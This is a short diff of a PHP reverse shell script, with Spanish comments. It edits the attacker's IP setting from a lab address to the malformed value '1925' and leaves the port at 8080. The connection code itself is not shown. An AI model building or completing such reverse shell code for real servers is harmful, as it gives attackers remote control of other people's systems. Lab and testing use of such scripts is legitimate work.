@@ -1,6 +1,6 @@
 <?php
 // Configuración del shell reverso
-$ip = '192.168.56.102'; // Cambia esto por la IP de tu máquina atacante
+$ip = '1925'; // Cambia esto por la IP de tu máquina atacante
 $port = 8080; // Cambia esto por el puerto que usarás
 
 // Creación de conexión
